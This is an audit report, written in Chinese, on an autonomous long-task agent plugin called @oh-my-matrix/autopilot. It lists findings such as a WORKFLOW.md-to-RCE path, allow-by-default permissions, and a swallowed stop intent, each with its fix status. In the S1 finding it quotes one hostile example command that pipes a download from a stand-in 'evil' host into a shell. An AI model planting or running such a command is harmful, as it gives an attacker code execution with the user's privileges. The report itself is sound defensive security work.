# @oh-my-matrix/autopilot 端到端审计报告

- **日期**:2026-06-30
- **对象**:`packages/autopilot/`(`@oh-my-matrix/autopilot`,package.json v2.2.0),OpenClaw-native 长任务持续执行插件
- **范围**:审计 only —— 跑标准验证套件取证 + 业界最佳实践对比;**不改源码**
- **方法**:静态通读(入口 `index.ts` 1117 行 + 18 个 src 文件)+ 验证套件实测 + **4 个对抗 reviewer 并行审查**(critic / architect / security-reviewer / code-reviewer)
- **结论一句话**:套件全绿(654/658 通过),但**绿 ≠ 功能正常 / 安全**——对抗 review 实锤一类信任面/RCE 级缺陷(P0×2、高×3),原"基本对齐最佳实践"的初判被推翻。

> **Status(updated 2026-07-01)**:P0 已全部闭环。
> - **S1**(WORKFLOW.md→RCE)✅ #44(binary allowlist)+ #45(trustWorkspace 边界 + eval-flag block)
> - **S3**(停止意图被吞)✅ #44(switch 补 `case 'finalize'`)
> - **S1-residual A+B** ✅ #45
> - **S14**(version 四方漂移)✅ #48(同步到 3.0.0)
> - **S17**(dist 与源码漂移)✅ #44/#48(dist 重新提交)
> - 关联:permission-policy 自身安全修复 B1/B2/B5/F1/F2/F3 ✅ #46
>
> **未修(tracked in follow-up issue)**:S2(allow-by-default)/ S4(cwd fallback)/ S5(Windows shell 元字符)/ S6(fail-open evidence)/ S7(装配层 async 竞态)/ S8(audit refCount 泄漏)/ S9(FIFO 误称 LRU)/ S10(token 预算静默失效)/ S11(跨进程并发上限失效)/ S12(审计日志路径污染)/ S13(幂等 key 撞/复用)/ S15(CJS/ESM 未钉 type)/ S16(模块级单例二次 register 不清)。详见 §7。

---

## 1. 执行摘要

**功能判定**:编译、类型、lint、测试、打包**全部通过**(详见 §3)。单从 CI 信号看"功能正常"。但这正是陷阱——测试套件由被测方编写,对**信任边界、退化条件、装配层并发**无断言,因此全部发现项(S1-S17)在绿灯下依然成立。

**最佳实践对齐度**:初版报告第 4 节 8 个 ✅ 被 4 个对抗 reviewer 推翻 5 项(2→❌、3→⚠️)。根因是**存在性核对**(只看机制在不在)而非**名副其实性核对**(看机制是否被绕过 / 退化下是否生效 / 信任谁)。

**最该立即处置**:
- 🔴 **S1 WORKFLOW.md → 自主循环 RCE**(无鉴权,攻击者控制工作区即得 host 用户权限 RCE)
- 🟠 **S3 停止意图被吞 + 可自主复活**(用户控制权丧失,且 lifecycle 测试**冻结了错误行为**)

完整发现项见 §7。审计 only,不改源码;P0/高项建议作为独立修复工单跟进。

---

## 2. 端到端流程(文字图)

```
autopilot.activate(workspace 校验 validateWorkspacePath
  → loadWorkflowConfig(读 WORKFLOW.md,⚠️ S1/S4 信任面)
  → orchestrator: activate_requested → workspace_ready)
→ agent_turn_prepare (目标捕获 + effort 注入 + model routing)
→ 运行期 hooks:
    before_tool_call  (权限门 ⚠️ S2 allow-by-default / 审计写入 ⚠️ S12)
    llm_output        (token 计量 ⚠️ S10 host 不报则失效)
    after_tool_call   (工具错误追踪)
→ before_agent_finalize (decideContinuation: revise/cross_turn/pause/complete
                         ⚠️ S3 finalize 落 default 成 continue)
→ complete (evidence gate: runValidationCommands execFile 执行 ⚠️ S1/S5
            catch → skipped → done ⚠️ S6 fail-open)
旁路:stall 轮询(60s) · retry queue(backoff) · orphan 清理(24h)
      · compaction 前后 goal preserve/restore
装配层:模块级 Map 单例 · async hook setState(⚠️ S7 竞态)· audit refCount(⚠️ S8)
```

---

## 3. Phase 1 验证套件实测取证

| 命令 | 结果 | 备注 |
|------|------|------|
| `pnpm -r typecheck` | ✅ **0 error** | 3 workspace(permission-policy / dynamic-workflows / root)全 Done |
| `pnpm -w run lint` | ✅ **0 error, 30 warning** | warning 多为 hook event 的 `any` 与若干 `==`/`!=`(eqeqek);不阻断 |
| `pnpm test`(autopilot) | ✅ **50 files / 654 passed / 4 skipped** | 含 7 个 e2e(lifecycle / resilience / projection-pause-reasons / evidence-gate-execfile / goal-compaction / workflow-config-roundtrip / dist-barrel-contract) |
| `pnpm build`(tsc) | ✅ 成功 | dist 再生 |
| `pnpm pack` | ✅ `oh-my-matrix-autopilot-2.2.0.tgz` | 含 dist + openclaw.plugin.json + package.json + README |

### 实测副产物(新增 / 修订发现项)
- **S17(新,中)dist 与源码漂移**:build 后 `git status` 显示 **22 个 dist 文件变更**(`M` + untracked),其中 `dist/src/model-routing.*` **从未提交**。已提交的 dist 落后于源码 → 走 tgz 消费的下游拿到的是旧产物。
- **S15(修订,中 → 低-中)CJS/ESM**:`node -e "require('./packages/autopilot/dist/index.js')"` → **LOADED OK**(`register` typeof function、`id: autopilot`)。模块系统在 Node 默认解析下**当前能加载**(部分证伪原"可能崩"判断);但靠"最近 package.json 无 type → 回退 .js → commonjs"的**隐式**行为,未显式钉 `"type":"commonjs"`,仍是脆弱性,非阻断。
- **S14(实锤)version 导出**:`node` 烟测返回 `exported version: 2.0.0`(落后 package.json 2.2.0 / README v2.1.1)。
- require 时实测命中降级:`[autopilot] audit plugin not loaded — monitor mode coordination unavailable`(对应 index.ts:84-98 的 try/catch,降级路径生效)。

---

## 4. 功能正确性评估(带测试证据)

逐子系统对照覆盖它的测试文件——**这些覆盖证明了"被测路径行为符合被测方预期",不证明"信任边界/退化正确"**:

| 子系统 | 主要测试 | 评 |
|--------|---------|-----|
| reducer 状态机 | `orchestrator.test.ts`、`tier1-type-safety` | 迁出门卫互斥扎实;但 reducer 纯净 ≠ 装配层无竞态(S7) |
| 续跑决策 | `continuation-engine.test.ts` + e2e lifecycle T6/T12 | MIN_TURNS 早完成守卫到位;但 finalize 落 default 被测成"冻结行为"(S3) |
| 证据门 | `evidence-gate.test.ts` + `e2e/evidence-gate-execfile` | execFile 真跑;但 catch→skipped→done 无断言(S6),且 command 来源无 allowlist(S1) |
| stall / retry | `stall-detector.test.ts`、`retry-queue.test.ts` | 机制正确;retry 三入口 guard 互斥(reviewer 自查排除"重复 +1"伪命题) |
| 权限 | `permission-wiring`、`phase7-permission-classifier` | 分类器覆盖好;但 **allow-by-default 无断言**(S2) |
| 并发 / 淘汰 | `autopilot-concurrency`、`lru-cleanup` | 命名 `lru-cleanup` 测的实为 FIFO(S9);跨进程并发无测(S11) |
| token | `token-double-count`、`p1-cost-and-prompts` | 双计已被证伪(reviewer 排除);host 不报 usage 无测(S10) |
| audit 平衡 | `audit-lifecycle-balance` | 只测 5 条干净路径,**漏 session_end/orphan/LRU 三路径**(S8) |
| 压缩目标保持 | `e2e/goal-compaction` | 到位 |

---

## 5. 业界最佳实践对比(修订版)

| 维度 | 业界做法 | autopilot 现状 | 评 |
|------|---------|---------------|-----|
| 状态机 | 显式状态 + 受控迁移 | 纯 reducer + OrchestrationState 枚举 | ✅(reducer 层)但装配层有竞态 → ⚠️ S7 |
| 完成判定 | 不信任 LLM 自报 done | 证据门 + MIN_TURNS 守卫 | ✅ 设计;但 fail-open(S6)削弱 |
| **权限** | 最小权限 / fail-closed | **allow-by-default 黑名单**(`no defaultDeny`) | ❌ **S2** |
| 容错 | 分类可恢复性 + 退避 + 上限 | retry-queue + classifyRecoverability | ✅ |
| 防僵尸 | stall + orphan 清理 | stall_timeout + 24h orphan | ✅ |
| 上下文丢失 | 压缩前后快照/恢复 | goal-manager preserve/restore | ✅ |
| **资源边界** | 并发上限 + token 预算 + 真正 LRU | maxConcurrent + tokenBudget + **FIFO 误称 LRU** | ❌ **S9**;token 静默失效 ⚠️ S10;跨进程失效 ⚠️ S11 |
| **可信输入** | 外部配置 fail-closed + allowlist | WORKFLOW.md 任意 command 直达 execFile | ❌ **S1** |
| 版本治理 | 单一事实源 | 三方漂移 | ⚠️ S14 |
| 模块系统 | 显式 type | 未钉(实测当前可加载) | ⚠️ S15 |
| 测试入口卫生 | 测试辅助不进 barrel | `_xxxForTest` 在 barrel(prod 守卫已加) | ⚠️ 轻微 |

---

## 6. 对抗 Review 说明(方法论)

4 个 reviewer 各带一个**推翻命题**,默认怀疑、找实锤反驳。结果:初版 ✅ 过半被推翻,且挖出一整类信任面问题。reviewer 还**自查排除了 2 条伪攻击命题**(retry 重复 +1、token 双计),非一边倒乱咬,可信度高。

根因(适用于任何同类审计):"机制存在" ≠ "机制名副其实"。绿测试 + ✅ 表格的Confirmation bias,只有带着"它信任谁 / 退化下会怎样 / 谁能绕过它"的问题去读代码才能破。

---

## 7. 发现项总表(按严重度;均附 file:line)

### P0 / 严重
| # | 发现 | 实锤 | 触发 / 后果 |
|---|------|------|------------|
| **S1** | **WORKFLOW.md → 自主循环 RCE**(✅ **已实跑确证**) | `index.ts:886-909`(applyWorkflowConfig 灌入 validation.commands)、`index.ts:392-401`(complete 时 runValidationCommands → execFile)、`workflow-config.ts:100-124`(接受任意 command,无 allowlist) | 攻击者控制的工作区放 WORKFLOW.md(`command:"curl evil \| sh"`),用户 activate 后**完成时自动执行**,host 用户权限 RCE。**PoC 复现**:无害探针 `command: node …/genmarker.cjs` 经 loadWorkflowConfig 无过滤解析 → runValidationCommands execFile 执行(passed)→ 标记文件生成。链路确证 |
| **S2** | **allow-by-default 黑名单 ≠ 纵深防御** | `index.ts:637-638`(注释 `no defaultDeny` 且不传)、`permission-policy.ts:413-417`(`Unclassified command allowed by default`) | 自主持续 agent 上,任何未分类工具/未知命令默认放行 = 单次触发全自动 |

### 高
| # | 发现 | 实锤 | 触发 / 后果 |
|---|------|------|------------|
| **S3** | **停止意图被吞 + 可自主复活** | `continuation-engine.ts:27,31`(返回 `{action:'finalize'}`)、`index.ts:314` switch 无 `case 'finalize'` → 落 `default`(429-430)成 `continue`、`tests/e2e/lifecycle.e2e.test.ts:225-244` **冻结错误行为** | 用户按停止失效;run 留 `status='running'`,stall(5-10min)/agent_end 可**无视停止继续复活**,token/continuations 持续烧 |
| **S4** | **process.cwd() fallback + baseRepoPath 硬编码**(放大 S1) | `index.ts:937,957`(`payloadWorkspacePath ?? process.cwd()`)、`index.ts:886`(`loadWorkflowConfig(process.cwd(), …)`) | workspacePath 缺失/非法时 containment 落 host 目录;host cwd 下不受信 WORKFLOW.md **始终被查** |
| **S5** | **Windows shell:true 重启元字符**(条件放大 S1) | `command-runner.ts:106-124`(shouldUseShell 开 `shell:true`)、`parseCommandArgs` 不剥 `\|;&` | Windows 上 S1 注入 command 经 cmd.exe,字面元字符可被解释 → RCE |

### 中
| # | 发现 | 实锤 | 备注 |
|---|------|------|------|
| **S6** | **fail-open 证据门 → skipped → done** | `index.ts:402-406`(catch 成 skipped)、`orchestrator.ts:196-205`(skipped 一律 done) | 当前 catch 多为死代码,latent footgun;业界证据门核心是 fail-closed |
| **S7** | **装配层 async hook 竞态** | `before_agent_finalize`(290)、`agent_end`(726)在 `await enqueue`(332/751)期间可被其它 hook setState;`index.ts:762-770` 的 merge 补丁是竞态直接证据 | reducer 纯净 ≠ 无 lost-update |
| **S8** | **audit refCount 泄漏** | `session_end`(712-724)、orphan(1106-1114)、LRU(198-224)三清理路径都不调 `setAuditMode('active')` | 正常关闭的 full_yolo 会话永不还引用,monitor 计数单调上涨 |
| **S9** | **FIFO 误称 LRU** | `evictOldestRuns` 按 `startedAt`(204)淘汰,200 行注释自承 FIFO | 活跃但创建早的长任务被优先杀;测试命名 `lru-cleanup` 跟着错 |
| **S10** | **token 预算:host 不报 usage 则失效** | `index.ts:683-688`(`if(!usage?.total) return`)→ 恒 0;`continuation-engine.ts:61` 预算门永不触发 | 静默退化,无告警 |
| **S11** | **跨进程状态不可见 → 并发上限失效** | 模块级 Map(69-72)、`runningCount`(863)只数本进程 | fork worker / 多 host 共用插件时,实际并发 = N × 配置上限 |
| **S12** | **审计日志软链接/路径污染** | `validateWorkspacePath`(50-57)不 resolve 软链接/不拒敏感目录;`audit-persister.ts` `appendFileSync` catch 静默吞失败 | workspacePath 攻击者可控时审计可写任意路径 / 失败静默丢证据 |
| **S17** | **dist 与源码漂移**(实测新发现) | build 后 22 个 dist 文件 `git status` 变更,`dist/src/model-routing.*` 从未提交 | 下游 tgz 消费者拿到旧产物;CI 应自动化 tgz 刷新(ADR-010 follow-up #1) |

### 低 / 信息
| # | 发现 | 实锤 |
|---|------|------|
| **S13** | 幂等 key 跨路径撞/复用 | `index.ts:322/335/754` revise/cross_turn/degraded 三前缀拼同一 totalContinuations,fallback 多次 increment 破坏单调性 |
| **S14** | version 三方漂移(实测导出 2.0.0) | `index.ts:61` 2.0.0 / package.json 2.2.0 / README v2.1.1;影响应急响应与下游契约 |
| **S15** | CJS/ESM 未钉 type(**实测当前可加载**) | dist require 烟测 OK;但靠隐式回退,应显式 `"type":"commonjs"` |
| **S16** | 模块级单例 register() 二次不清状态 | `index.ts:1059` 二次 register 只 clearInterval 不清 4 个 Map;HMR/多 host 串扰,生产无重置入口 |

### Reviewer 自查排除的伪命题(记录,避免再当问题)
- **retry 多入口重复 +1**:不成立。三入口 orchState guard 互斥;`retry_due` 转 claimed 不清 retry,递增正确。
- **token 双计**:不成立。`token-double-count.test.ts` 确证 totalTokensUsed 仅 `index.ts:691` 加一次。
- **setInterval 重入/漏清理**:不是问题。`index.ts:1059` 显式 clearInterval;轮询用独立数组遍历后删。
- **审计单文件撑爆磁盘**:不是问题。有按日 rotation + 10MB 切分;但**文件数无界**(无保留策略),归卫生项。

---

## 8. 局限
- 未做真实 OpenClaw host 全链路 live 烟测(用户选标准套件);S15 已用 `node -e require` 补 CJS 加载烟测闭环。
- 对抗 review 为静态推理 + 源码实锤;**S1 已补充实跑 PoC 确证**(无害探针 command 经 loadWorkflowConfig 无过滤解析 → runValidationCommands 执行 → 副作用产生,见 §7 S1)。**S3 由现有测试 `tests/e2e/lifecycle.e2e.test.ts:225-244` 冻结的错误行为直接证明**,无需复现。S2/S4/S5 等仍为代码路径推导,进修复前可按需补 PoC。
- 安全 reviewer 跑了 `pnpm audit --prod`(清洁)与 git 历史密钥扫描(清洁)。

---

## 9. 建议后续工单(审计 only;供单独决策)
1. **[P0] S1**:WORKFLOW.md `validation.commands` 加二进制 allowlist + operator 签名;complete 前校验。
2. **[P0] S3**:switch 补 `case 'finalize'`,在其中走 stop/deactivate;把 lifecycle 测试 line 225-244 的"冻结注释"翻成正确行为断言。
3. **[高] S2**:主会话传 `defaultDeny:true`(或转 allowlist 模型)。
4. **[高] S4**:workspacePath 不可解析时拒绝 activate,移除 `process.cwd()` baseRepoPath 硬编码。
5. **[高] S5**:parseCommandArgs 剥 `|;&` 与 cmd 元字符,shouldUseShell 路径拒绝含操作符命令。
6. **[中] S6/S8/S9/S10/S11/S12/S17**:逐项修;S8 需补 session_end/orphan/LRU 路径的 refCount 平衡测试;S17 接 ADR-010 follow-up 自动化 tgz 刷新。
7. **[低] S13-S16**:卫生项,择机。

---

*报告生成自 sciomc 研究流程 + 4-agent 对抗 review;Phase 1 实测证据见 §3。源码未改动。*
